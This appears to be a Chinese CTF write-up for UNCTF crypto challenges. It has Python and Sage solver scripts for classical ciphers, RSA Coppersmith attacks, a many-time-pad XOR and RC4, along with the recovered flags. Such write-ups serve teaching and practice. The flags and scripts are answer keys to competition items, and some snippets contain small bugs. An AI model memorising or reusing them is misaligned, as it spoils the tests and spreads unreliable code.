md5md5dic=[&quot;4c614360da93c0a041b22e537de151eb&quot;,&quot;c1fd731c6d60040369908b4a5f309f41&quot;,&quot;80fdc84bbb5ed9e207a21d5436efdcfd&quot;,&quot;b48d19bb99a7e6bb448f63b75bc92384&quot;,&quot;39eaf918a52fcaa5ed9195e546b021c1&quot;,&quot;795d6869f32db43ff5b414de3c235514&quot;,&quot;f59a054403f933c842e9c3235c136367&quot;,&quot;c80b37816048952a3c0fc9780602a2fa&quot;,&quot;810ecef68e945c3fe7d6accba8b329bd&quot;,&quot;cad06891e0c769c7b02c228c8c2c8865&quot;,&quot;470a96d253a639193530a15487fea36f&quot;,&quot;470a96d253a639193530a15487fea36f&quot;,&quot;4bdea6676e5335f857fa8e47249fa1d8&quot;,&quot;810ecef68e945c3fe7d6accba8b329bd&quot;,&quot;edbb7ab78cde98a07b9b5a2ab284bf0a&quot;,&quot;44b43e07e9af05e3b9b129a287e5a8df&quot;,&quot;a641c08ed66b55c9bd541fe1b22ce5c0&quot;,&quot;abed1f675819a2c0f65c9b7da8cab301&quot;,&quot;738c486923803a1b59ef17329d70bbbd&quot;,&quot;7e209780adf2cd1212e793ae8796ed7c&quot;,&quot;a641c08ed66b55c9bd541fe1b22ce5c0&quot;,&quot;a641c08ed66b55c9bd541fe1b22ce5c0&quot;,&quot;636a84a33e1373324d64463eeb8e7614&quot;,&quot;6ec65b4ab061843b066cc2a2f16820d5&quot;,&quot;a4a39b59eb036a4a8922f7142f874114&quot;,&quot;8c34745bd5b5d42cb3efe381eeb88e4b&quot;,&quot;5b1ba76b1d36847d632203a75c4f74e2&quot;,&quot;d861570e7b9998dbafb38c4f35ba08bc&quot;,&quot;464b7d495dc6019fa4a709da29fc7952&quot;,&quot;8eb69528cd84b73d858be0947f97b7cc&quot;,&quot;dd6ac4c783a9059d11cb0910fc95d4a&quot;,&quot;4b6b0ee5d5f6b24e6898997d765c487c&quot;,&quot;b0762bc356c466d6b2b8f6396f2e041&quot;,&quot;8547287408e2d2d8f3834fc1b90c3be9&quot;,&quot;82947a7d007b9854fa62efb18c9fd91f&quot;,&quot;8ddafe43b36150de851c83d80bd22b0a&quot;,&quot;c7b36c5f23587e285e528527d1263c8b&quot;,&quot;2a0816e8af86e68825c9df0d63a28381&quot;,&quot;63ce72a42cf62e6d0fdc6c96df4687e3&quot;,]realmd5=[]for i in range(len(md5dic)):    if i == 0:        realmd5.append( md5dic[i])    else:        realmd5.append(hex(int(md5dic[i],16)^int(realmd5[i-1],16))[2:])dic=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#125;&#123;&quot;flag =&quot;&quot;for i in realmd5:    print(i)    if len(i) == 31:        i = &#x27;0&#x27; + i    for x in dic:        if md5(x.encode()).hexdigest() == i:            # print(x)            flag += xprint(flag)\n\ndddd一眼摩斯\ncaesar用BASE64的表进行凯撒加密，直接用最常见的BASE表就行，没有用自己打乱的表是出题人的仁慈\n#B6vAy&#123;dhd_AOiZ_KiMyLYLUa_JlL/HY&#125;#UNCTF&#123;w0w_Th1s_d1fFerentc_4eSar&#125;puzzle = &quot;B6vAydhdAOiZKiMyLYLUaJlL/HY&quot; #暂时去掉表里没有的字符charset = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;flag = &quot;&quot;for i in puzzle:    print(i)    local = charset.index(i)    ans = charset[((local+19)%64)]    flag+=ansprint(flag)\n\nezRSA发现是一个数的四次方，直接yafu分解，然后正常的RSA解密就行\nSingle tableplayfair密码，可以按照他的提示自己慢慢手撸，也有在线网站\nMulti table动手分析分析，根据前面的字符是 UNCTF 就能确定下来key，然后就是常规的维吉尼亚解密\nfrom string import ascii_uppercasepuzzle = &quot;SDCGW&#123;MPN_VHG_AXHU_GERA_SM_EZJNDBWN_UZHETD&#125;&quot;base_table = [&#x27;J&#x27;, &#x27;X&#x27;, &#x27;I&#x27;, &#x27;S&#x27;, &#x27;E&#x27;, &#x27;C&#x27;, &#x27;R&#x27;, &#x27;Z&#x27;, &#x27;L&#x27;, &#x27;U&#x27;, &#x27;K&#x27;, &#x27;Q&#x27;, &#x27;Y&#x27;, &#x27;F&#x27;, &#x27;N&#x27;, &#x27;V&#x27;, &#x27;T&#x27;, &#x27;P&#x27;, &#x27;O&#x27;, &#x27;G&#x27;, &#x27;A&#x27;, &#x27;H&#x27;, &#x27;D&#x27;, &#x27;W&#x27;, &#x27;M&#x27;, &#x27;B&#x27;]table = &#123;&#125;for i in range(26):    table[i] = ascii_uppercase[i:] + ascii_uppercase[:i]# print(table)key = [9,15,23,16]c = &#x27;&#x27;x = 0for i in range(len(puzzle)):    if puzzle[i] in ascii_uppercase:        c += base_table[table[key[x%4]].index(puzzle[i])]        x += 1    else:        c += puzzle[i]print(c)  #UNCTF&#123;WOW_YOU_KNOW_THIS_IS_VIGENERE_CIPHER&#125;\n\nbabyRSA题目是这样:\nfrom Crypto.Util.number import *from secret import flagimport libnumflag = &quot;UNCTF&#123;*************************&#125;&quot;m = libnum.s2n(flag)p = libnum.generate_prime(1024)q = libnum.generate_prime(1024)n = p * qe = 6c = pow(m, e, n)M = ((m &gt;&gt; 60) &lt;&lt; 60)print(&quot;n=&quot;, n)print(&quot;c=&quot;, c)print(&quot;((m&gt;&gt;60)&lt;&lt;60)=&quot;, M)&#x27;&#x27;&#x27;253002082426520338693572807935022601978029392333469962268837886045455584382307159254854816883399164618487317408566701104241961913026892789838029176782621668459819901824346536548125407007812538688330887114823308861569606387112998296381346153259867829432913296060458399791940689552359825644522931911510715858865242296375184117363635015466949354146872152587949603538547814491614868365022488312188002429166639931236706933624785266067125794269283381813996778071357489476359647986466370841281238832970264882468831315041157671351940847340550033194528746354269423287807119150450040512810142370344535592057032786663945948594311538913131161341550884480029599510661202285769263890531598080705007353785885738272850214259330194804852694485208989783234060173678127420493457823467268768089115412925231063402455495379937226554074002491575864781290664710914509461332399405821470355871768593061137126824712196081719561683737407651098626011246991410667481592587007447918267767381223520798973929939493233877022022587607037959444007593696217145777150848881992364053065334840979523203307650218664365181461052467433276851159837828464388935577245751092889810583803455694394934874971067519545042290579588111340924326982298882803366656069751287526661788551410711941439146252171444944646015445273361862078914338385912062672317789429687879409370001983412365416202240&#x27;&#x27;&#x27;\n\nRSA的已知m高位攻击，不过这个使用低加密指数也能写\nsage在线运行\n#sage部分:c = 15389131311613415508844800295995106612022857692638905315980807050073537858857382728502142593301948048526944852089897832340601736781274204934578234672687680891154129252310634024554953799372265540740024915758647812906647109145094613323994058214703558717685930611371268247121960817195616837374076510986260112469914106674815925870074479182677673812235207989739299394932338770220225876070379594440075936962171457771508488819923640530653348409795232033076502186643651814610524674332768511598378284643889355772457510928898105838034556943949348749710675195450422905795881113409243269822988828033666560697512875266617885514107m_high = 11941439146252171444944646015445273361862078914338385912062672317789429687879409370001983412365416202240kbits = 60B = 1nbits = n.nbits()PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = (m_high + x)^e - cx0 = f.small_roots(X=2^kbits, B=1)[0]print(&quot;m:&quot;, m_gao + x0)#得到m=11941439146252171444944646015445273361862078914338385912062672317789429687879409370002429378909002883709print(libnum.n2s(11941439146252171444944646015445273361862078914338385912062672317789429687879409370002429378909002883709))# b&#x27;UNCTF&#123;27a0aac7-76cb-427d-9129-1476360d5d1b&#125;&#x27;\n\neasy_RSA题目是这样:\nfrom Crypto.Util.number import *from gmpy2 import *from secret import flagimport randomassert flag.startwith(b&quot;flag&#123;&quot;)e=0x10001c=6423951485971717307108570552094997465421668596714747882611104648100280293836248438862138501051894952826415798421772671979484920170142688929362334687355938148152419374972520025565722001651499172379146648678015238649772132040797315727334900549828142714418998609658177831830859143752082569051539601438562078140 n=102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553m=bytes_to_long(flag)p=getprime(512)q=getprime(512)n=p*qc=pow(m,e,n)print(&quot;n=&#123;&#125;&quot;.format(n))print(&quot;c=&#123;&#125;&quot;.format(c))tmp=random.randint(100,300)print(&quot;p&gt;&gt;tmp=&#123;&#125;&quot;.format(p&gt;&gt;tmp))#c=6423951485971717307108570552094997465421668596714747882611104648100280293836248438862138501051894952826415798421772671979484920170142688929362334687355938148152419374972520025565722001651499172379146648678015238649772132040797315727334900549828142714418998609658177831830859143752082569051539601438562078140 #n=102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553#p&gt;&gt;200=8183408885924573625481737168030555426876736448015512229437332241283388177166503450163622041857\n\nRSA的已知P高位攻击coppersmith攻击\nn = 102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553p0 = 8183408885924573625481737168030555426876736448015512229437332241283388177166503450163622041857e = 0x10001pbits = 512kbits = pbits - p0.nbits()p0 = p0 &lt;&lt; kbitsPR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x + p0roots = f.small_roots(X=2^kbits, beta=0.4)if roots:            p = p0+int(roots[0])     print(&quot;p: &quot;+str(p))    print(&quot;q: &quot;+str(n//p))\n\n得到\np: 13150231070519276795503757637337326535824298772055543325920447062237907554543786311611680606624189166397403108357856813812282725390555389844248256805325917q: 7763324082495716852870824316200424018139567206154696104953385573761033160220038511251268217230653629388520339723337700045392099450472580225771046069366909\n\n得到p,q之后，就是常规的RSA解密了\nezxor经典MTP，详情可以看老学长的博客\nimport Crypto.Util.strxor as xoimport libnum, codecs, numpy as npdef isChr(x):    if ord(&#x27;a&#x27;) &lt;= x and x &lt;= ord(&#x27;z&#x27;): return True    if ord(&#x27;A&#x27;) &lt;= x and x &lt;= ord(&#x27;Z&#x27;): return True    return Falsedef infer(index, pos):    if msg[index, pos] != 0:        return    msg[index, pos] = ord(&#x27; &#x27;)    for x in range(len(c)):        if x != index:            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ ord(&#x27; &#x27;)def know(index, pos, ch):    msg[index, pos] = ord(ch)    for x in range(len(c)):        if x != index:            msg[x][pos] = xo.strxor(c[x], c[index])[pos] ^ ord(ch)dat = []def getSpace():    for index, x in enumerate(c):        res = [xo.strxor(x, y) for y in c if x!=y]        f = lambda pos: len(list(filter(isChr, [s[pos] for s in res])))        cnt = [f(pos) for pos in range(len(x))]        for pos in range(len(x)):            dat.append((f(pos), index, pos))c = [codecs.decode(x.strip().encode(), &#x27;hex&#x27;) for x in open(&#x27;Problem.txt&#x27;, &#x27;r&#x27;).readlines()]msg = np.zeros([len(c), len(c[0])], dtype=int)getSpace()dat = sorted(dat)[::-1]for w, index, pos in dat:    infer(index, pos)know(9, 19, &#x27;o&#x27;)know(1, 24, &#x27;i&#x27;)know(1, 25, &#x27;t&#x27;)know(1, 26, &#x27;h&#x27;)print(&#x27;\\n&#x27;.join([&#x27;&#x27;.join([chr(c) for c in x]) for x in msg]))key = xo.strxor(c[0], &#x27;&#x27;.join([chr(c) for c in msg[0]]).encode())print(key)\n\n今晚吃什么两次培根就行\nToday_is_Thursday_V_me_50很烂的一道题，加密算法分析半天，发现所需要的key就是题目名称，烂完了\nimport randomimport itertoolsfrom Crypto.Util.number import *from Crypto.Util.strxor import strxorflag=b&#x27;&#x27;name = &quot;unctf&quot;key1 = b&#x27;Today_is_Thursday_V_me_50&#x27;puzzle = b&#x27;Q\\x19)T\\x18\\x1b(\\x03\\t^c\\x08QiF&gt;Py\\x124DNg3P&#x27;key1_num = bytes_to_long(key1)def decrypt_2(message,num):    random.seed(num)    res_2 = b&#x27;&#x27;    for i in message:        temp_num = random.randint(1,128)        res_2 += long_to_bytes(temp_num ^ i)    return res_2if __name__ == &#x27;__main__&#x27;:    s1 = decrypt_2(puzzle,key1_num)    print(s1)    s2 = strxor(b&#x27;cuftn&#x27;*5,key1)    s3 = strxor(s2,s1)    print(s3)\n\nEZcry流密码，尝试后可以知道是RC4，问题出在得先转成16进制才能使用RC4解密\nimport libnuma=28215806134317522883596419220825657511411006710664649462842055320370860932420278362078094716b=3544952156018063160print(hex(a))  #0xdd9f58b37289edc2c40133ab9f0439c140aafe7cfd501f8c3d79b1856c9bda598ce34a02a57cprint(hex(b))  #0x3132333435363738\n\n\n超级加倍原来就是单纯的开四次方啊😅，是我想多了还是想少了？\nimport gmpy2import libnumpuzzle=364948328635256862807658970246807356738683637564484151183420122283833769442806688034764747801289594899501872549412387392353830842750341246881725380294423193634163908298756097744423833369487321345708403908358587818931161805853745707954962941881920962518131654701890269025702523666873057795301975752113492236398361724355733200822450695761a=gmpy2.iroot(puzzle,4)print(a) #(mpz(777244835068351678348953354168377613564714552731792102125659619461244461053654492541), True)print(libnum.n2s(777244835068351678348953354168377613564714552731792102125659619461244461053654492541))# b&#x27;flag&#123;it_is_much_bigger_than_before&#125;&#x27;\n\nAlien’s_secret\n在这个网站里可以找到对应表格，https://uazu.net/notes/alien.html，直接翻译即可\nRE PWN只做了最简单的几道二进制，脱UPX壳后扔IDA可以直接看代码，简单的逆向一下就好了，pwn则是nc直接连接，输入密码就给shell\n","categories":["WriteUp"],"tags":["Learn","CTF","PHP","反序列化"]}]